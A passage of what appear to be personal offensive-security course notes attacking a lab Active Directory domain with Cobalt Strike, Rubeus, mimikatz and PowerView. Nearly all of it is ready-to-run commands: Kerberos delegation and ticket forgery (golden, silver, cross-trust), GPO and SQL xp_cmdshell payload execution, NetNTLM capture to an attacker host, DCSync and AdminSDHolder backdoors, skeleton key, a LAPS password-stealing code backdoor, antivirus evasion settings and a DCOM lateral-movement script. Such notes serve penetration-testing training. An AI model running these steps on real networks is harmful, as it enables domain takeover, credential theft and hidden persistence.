[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\dc-2.kirbi", [System.Convert]::FromBase64String("...ticket..."))
```
```
make_token DEV\DC-2$ FakePass
kerberos_ticket_use C:\Users\Administrator\Desktop\dc-2.kirbi
```
## Constrained delegation
Find all computers configured for constrained delegation and what they are allowed to delegate to:
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

In BloodHound:
```
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
```

To perform delegation we need the TGT of the principal trusted for delegation:
```
mimikatz sekurlsa::ekeys
```
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /aes256:<eKeys> /opsec /ptt
```
**/impersonateuser** is the user we want to impersonate
**/msdsspn** is the service principal name that SRV-2 is allowed to delegate to
**/user** is the principal allowed to perform the delegation
**/aes256** is the **eKeys** of the **/user** from the output from mimikatz
**/opsec** mimic genuine S4U2Self and S4U2Proxy
**/ptt** pass the generated ticket directly into the current logon session
## Alternate service name
Service name is not validated in s4u so we can request TGS for any service run by DC-2$:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /aes256:<eKeys> /opsec /ptt
```
## Linux credential cache
SSH into a domain connected linux machine and extract cached TGT:
```
ls -la /tmp
```
Download the **krb5cc_xxx** files to your kali attacking machine.

Use impacket to convert the ticket from ccache to kirbi format:
```
impacket-ticketConverter krb5cc_xxx jking.kirbi
```

Use the kirbi with a sacrificial logon session:
```
make_token DEV\jking FakePass
kerberos_ticket_use C:\Users\Administrator\Desktop\jking.kirbi
```
# Group policy
The following is with powerview.

Find SIDs of principals that can create new GPOs in the domain:
```
powershell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=IO" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

Convert SID to readable text:
```
powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
```

Get principals that can write to the GP-Link attribute on OUs:
```
powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
```

Get all machines within an OU:
```
powershell Get-DomainComputer | ? { $_.DistinguishedName -match "OU=Tier 1" } | select DnsHostName
```

Get any GPO in the domain where a 4-digit RID has **WriteProperty**, **WriteDacl** or **WriteOwner**:
```
powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

Resolve ObjectDN:
```
powershell Get-DomainGPO -Name "{...}" -Properties DisplayName
```

In BloodHound:
```
MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) RETURN p
```
# Pivot listeners
Right click beacon, pivoting -> listener.

Add allow rule:
```
netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=tcp localport=4444
```

Remove rule:
```
netsh advfirewall firewall delete rule name="Allow 4444" protocol=tcp localport=4444
```
# RSAT
If GroupPolicy module is not installed:
```
Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
Install-WindowsFeature -Name GPMC
```

Create a new GPO and link it to OU:
```
powershell New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
```

Upload payload:
```
cd \\dc-2\software
upload C:\Payloads\pivot.exe
```

Find writeable software share with PowerView:
```
powershell Find-DomainShare -CheckShareAccess
```

```
powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\pivot.exe" -Type ExpandString
```
**-Value** can alternatively be **%COMSPEC% /b /c start /b /min**

```
gpupdate /target:computer /force
```
# SharpGPOAbuse
SharpGPOAbuse cannot create GPOs so we have to do that with RSAT or use existing GPOs.

Add immediate scheduled task to **PowerShell Logging** GPO, executes as soon as it is applied:
```
execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Debug\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
## Discretionary access control lists
Find any principal that has GenericAll, WriteProperty or WriteDacl on jadams:
```
powershell Get-DomainObjectAcl -Identity jadams | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select SecurityIdentifier, ActiveDirectoryRights | fl
```

```
powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
```

Wider search:
```
powershell Get-DomainObjectAcl -SearchBase "CN=Users,DC=dev,DC=cyberbotic,DC=io" | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

In BloodHound:
```
MATCH (g1:Group), (g2:Group), p=((g1)-[:GenericAll]->(g2)) RETURN p
```

Narrow it down:
```
MATCH (g1:Group {name:"1ST LINE SUPPORT@DEV.CYBERBOTIC.IO"}), (g2:Group), p=((g1)-[:GenericAll]->(g2)) RETURN p
```
## Reset user password
```
make_token DEV\jking Purpl3Drag0n
run net user jadams N3wPassw0rd! /domain
```
# Targeted kerberoasting
Instead of changing password, we set SPN on the account and kerberoast it and attempt to crack offline:
```
powershell Set-DomainObject -Identity jadams -Set @{serviceprincipalname="fake/NOTHING"}
powershell Get-DomainUser -Identity jadams -Properties ServicePrincipalName
```

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:jadams /nowrap
```

```
powershell Set-DomainObject -Identity jadams -Clear ServicePrincipalName
```
# Targeted ASREPRoasting
```
powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue
```

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:jadams /nowrap
```

```
powershell Set-DomainObject -Identity jadams -XOR @{UserAccountControl=4194304}
powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue
```
# Modify domain group membership
```
run net group "Oracle Admins" bfarmer /add /domain
run net user bfarmer /domain
```
# MS SQL Servers
PowerUpSQL is good for enumerating and interacting with MS SQL Servers.

```
powershell Get-SQLInstanceDomain
```

In BloodHound:
```
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
```

```
powershell Get-SQLConnectionTest -Instance "srv-1.dev.cyberbotic.io,1433" | fl
```

```
powershell Get-SQLServerInfo -Instance "srv-1.dev.cyberbotic.io,1433"
```

For multiple SQL servers:
```
powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```

Shows if bfarmer has sysadmin role:
```
powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select @@servername"
```

With impacket:
```
proxychains python3 /usr/local/bin/mssqlclient.py -windows-auth DEV/bfarmer@10.10.17.25
```
## MS SQL NetNTLM capture
Listen to incoming requests:
```
execute-assembly C:\Tools\InveighZero\Inveigh\bin\Debug\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N
```

Execute **EXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1** on the MS SQL server, where 10.10.17.231 is the server running Inveigh.

Crack with john with **--format=netntlmv2 --wordlist=rockyou.txt svc_mssql-netntlmv2**

Crack with hashcat with **-a 0 -m 5600 svc_mssql-netntlmv2 rockyou.txt**

With WinDivert + rportfwd combo (see NTLM relaying section), capture with smbserver.py:
```
python3 /usr/local/bin/smbserver.py -smb2support pwn .
```
## MS SQL command execution
With PowerUpSQL, enables xp_cmdshell for you:
```
powershell Invoke-SQLOSCmd -Instance "srv-1.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
```

Manually in heidi or mssqlclient.py:
```
EXEC xp_cmdshell 'whoami';
```
Gives error because xp_cmdshell has to be enabled first.

```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

```
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

Spawn beacon:
```
EXEC xp_cmdshell 'powershell -w hidden -enc <payload>';
```
There is a limit in SQL command length to prevent you from sending large payloads directly in the query.
## MS SQL lateral movement
Find links:
```
SELECT * FROM master..sysservers;
```

Query remote instance using **OpenQuery**:
```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
```
Note the double and single quotes.

```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell'' ');
```

Enable xp_cmdshell using RPC out if its enabled:
```
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [target instance] EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [target instance] 
```

Find links with Get-SQLServerLinkCrawl:
```
powershell Get-SQLServerLinkCrawl -Instance "srv-1.dev.cyberbotic.io,1433"
```

```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc <payload>'' ')
```

Deeper:
```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select * from openquery("sql01.zeropointsecurity.local", ''select @@servername; exec xp_cmdshell ''''powershell -w hidden -enc <payload>'''' '')')
```
## MS SQL privilege escalation
Find SeImpersonatePrivilege:
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe TokenPrivileges
```

Exploit:
```
execute-assembly C:\Tools\SweetPotato\bin\Debug\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc <tcp payload>"
```

```
connect localhost 4444
```
# Domain dominance
## DCSync backdoor
```
dcsync dev.cyberbotic.io DEV\krbtgt
```
Error.

In powerview:
```
powershell Add-DomainObjectAcl -TargetIdentity "DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights DCSync
```

```
dcsync dev.cyberbotic.io DEV\krbtgt
```
Now works.
## AdminSDHolder
```
run net group "Domain Admins" bfarmer /add /domain
```
Access denied.

```
powershell Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights All
```

```
run net group "Domain Admins" /domain
```

```
run net group "Domain Admins" bfarmer /add /domain
```
Works.
## Remote registry backdoor
```
powershell Add-RemoteRegBackdoor -Trustee DEV\bfarmer
```

```
powershell Get-RemoteMachineAccountHash -ComputerName srv-2
```
See silver tickets for this.
## Skeleton key
Only applicable to domain controllers.

Install key:
```
mimikatz !misc::skeleton
```

```
make_token DEV\Administrator mimikatz
```
## Silver tickets
```
mimikatz kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /target:srv-2 /service:cifs /aes256:<eKeys> /ticket:srv2-cifs.kirbi
```
**/user** is the username to impersonate
**/domain** is the current domain name
**/sid** is the current domain sid
**/target** is the target machine
**/aes256** is the AES256 key for the target machine
**/ticket** is the filename to save the ticket as

```
make_token DEV\Administrator FakePass
kerberos_ticket_use C:\Users\Administrator\Desktop\srv2-cifs.kirbi
```

| Technique         | Required service tickets |
| ----------------- | ------------------------ |
| psexec            | host, cifs               |
| winrm             | host, http               |
| dcsync (DCs only) | ldap                     |
## Golden tickets
```
dcsync dev.cyberbotic.io DEV\krbtgt
```

```
mimikatz kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /aes256:<eKeys> /ticket:golden.kirbi
```

```
make_token DEV\Administrator FakePass
kerberos_ticket_use C:\Users\Administrator\Desktop\golden.kirbi
```
# Forest & domain trusts
## Parent/child
```
powershell Get-DomainTrust
```

```
powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
```

```
powershell Get-DomainController -Domain cyberbotic.io | select Name
```

```
mimikatz kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /sids:S-1-5-21-378720957-2217973887-3501892633 /aes256:<eKeys> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:cyberbotic.kirbi
```
**/user** is the username to impersonate
**/domain** is the current domain
**/sid** is the current domain SID
**/sids** is the SID of the target group to add ourselves to
**/aes256** is the AES256 key of the current domains krbtgt account
**/startoffset** sets the start time of the ticket to 10 mins before the current time
**/endin** sets the expiry date for the ticket to 60 mins
**/renewmax** sets how long the ticket can be valid for it renewed

```
make_token CYBER\Administrator FakePass
kerberos_ticket_use C:\Users\Administrator\Desktop\cyberbotic.kirbi
```
## One-way (inbound)
```
powershell Get-DomainTrust
```

```
powershell Get-DomainComputer -Domain subsidiary.external -Properties DNSHostName
```

Alternative:
```
SharpHound -c DcOnly -d subsidiary.external
```

```
powershell Get-DomainForeignGroupMember -Domain subsidiary.external
```

```
powershell Get-NetLocalGroupMember -ComputerName ad.subsidiary.external
```

```
powershell Get-DomainGroupMember -Identity "Subsidiaryr Admins" | select MemberName
```

Use real password for this to work:
```
make_token DEV\jadams TrustNo1
ls \\ad.subsidiary.external\c$
```

Or use RC4/AES keys:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jadams /domain:dev.cyberbotic.io /aes256:<eKeys> /opsec /nowrap
```

Request a referral ticket from the current domain for the target domain:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgs /service:krbtgt/subsidiary.external /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:<...ticket...> /nowrap
```

Use the inter-realm TGT to request a TGS in the target domain:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgs /service:cifs/ad.subsidiary.external /domain:ad.subsidiary.external /dc:ad.subsidiary.external /ticket:<...ticket...> /nowrap
```

Write base64 encoded ticket to file:
```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\subsidiary.kirbi", [System.Convert]::FromBase64String("...ticket..."))
```

```
make_token DEV\jadams FakePass
kerberos_ticket_use C:\Users\Daniel\Desktop\subsidiary.kirbi
ls \\ad.subsidiary.external\c$
```
## One way (outbound)
```
powershell Get-DomainTrust -Domain cyberbotic.io
```

Find principals in cyberbotic.io that are note native to that domain but are from zeropointsecurity.local:
```
powershell Get-DomainForeignGroupMember -Domain cyberbotic.io
```

```
powershell Get-DomainGPOUserLocalGroupMapping -Identity "Jump Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
```

```
powershell Get-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName
```

```
net logons
ps
inject 4960 x64 tcp-local
```

```
powershell Get-Domain
remote-exec winrm sql01.zeropointsecurity.local whoami; hostname
jump winrm64 sql01.zeropointsecurity.local pivot-sql-1
```
# LASP
Check for **AdmPwd.dll**, then LAPS is enabled:
```
ls C:\Program Files\LAPS\CSE
```

Find GPOs that have LAPS or some other term in the name:
```
powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name GPCFileSysPath | fl
```

Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null:
```
powershell Get-DomainObject -SearchBase "LDAP://DC=dev,DC=cyberbotic,DC=io" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostName
```

Try to find the correct GPO and download the LAPS configuration:
```
ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{...name from above...}\Machine
download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{...name from above...}\Machine\Registry.pol
```

Parse-PolFile:
```
Parse-PolFile .\Registry.pol
```

In BloodHound:
```
MATCH (c:Computer {haslaps: true}) RETURN c
```

```
MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p
```

```
powershell Get-Command *AdmPwd*
powershell Find-AdmPwdExtendedRights -Identity Workstations | fl
```

Domain admins can read all LASP password attributes:
```
powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```

If not domain admin:
```
make_token DEV\jking Purpl3Drag0n
powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl
rev2self
make_token .\lapsadmin <password>
```

```
powershell Get-DomainObjectAcl -SearchBase "LDAP://OU=Workstations,DC=dev,DC=cyberbotic,DC=io" -ReseolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -like "*ReadProperty*" } | select ObjectDN, SecurityIdentifier
```
```
make_token DEV\jking Purpl3Drag0n
powershell Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
## LASP persistence
If we have password for a sensitive machine we can prevent it from updating its password by setting expiration date into the future:
```
powershell Get-DomainObject -Identity wkstn-2 -Properties ms-mcs-admpwdexpirationtime
```

```
powershell Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```

```
powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
## LASP backdoors
Source code: https://github.com/GreyCorbel/admpwd

```
ls C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\
```

Add backdoor in **Main/AdmPwd.PS/Main.CS** after **PasswordInfo pi** line:
```
var line = $"{pi.ComputerName} : {pi.Password}";
System.IO.File.AppendAllText(@"C:\Temp\LAPS.txt", line);
```

Compile the project and upload AdmPwd.PS.dll to the machine:
```
upload C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll
```

Run **Get-AdmPwdPassword** and then check C:\Temp.


```
ls C:\Temp
shell type C:\Temp\LAPS.txt
```
# Bypassing antivirus
**jump psexec64** user a compiled x64 service binary and **jump winrm64** uses x64 PowerShell.

Check detected threats with Get-MpThreatDetection:
```
remote-exec winrm dc-2 Get-MpThreatDetection | select ActionSuccess, DomainUser, ProcessName, Resources
```

```
Get-MpThreatDetection | sort $_InitialDetectionTime | select -First 1
```

**Artifact kit** modifies compiled artifacts and **resource kit** modifies script-based artifacts.

Check with ThreatCheck:
```
C:\Tools\ThreatCheck\ThreatCheck\bin\debug\ThreatCheck.exe -f C:\Payloads\beacon-smb-svc.exe
```

https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/webbug.profile
Profile changes:
```
set sleeptime "1";
set tasks_max_size "2097152";

stage {
	set userwx "false";
	set cleanup "true";
	set obfuscate "true";
	set module_x64 "xpsservices.dll";
}

post-ex {
	set amsi_disable "true";
	set spawnto_x64 "c:\\windows\\sysnative\\dllhost.exe";
	set spawnto_x86 "c:\\windows\\syswow64\\dllhost.exe";
}
```

Create **dcom.cna**:
```
sub invoke_dcom
{
	local('$handle $script $oneliner $payload');
	
	# acknowledge this command1
	btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");
	
	# read in the script
	$handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
	$script = readb($handle, -1);
	closef($handle);
	
	# host the script in Beacon
	$oneliner = beacon_host_script($1, $script);
	
	# generate stageless payload
	$payload = artifact_payload($3, "exe", "x64");
	
	# upload to the target
	bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);
	
	# run via powerpick
	bpowerpick!($1, "Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);
	
	# link if p2p beacon
	beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```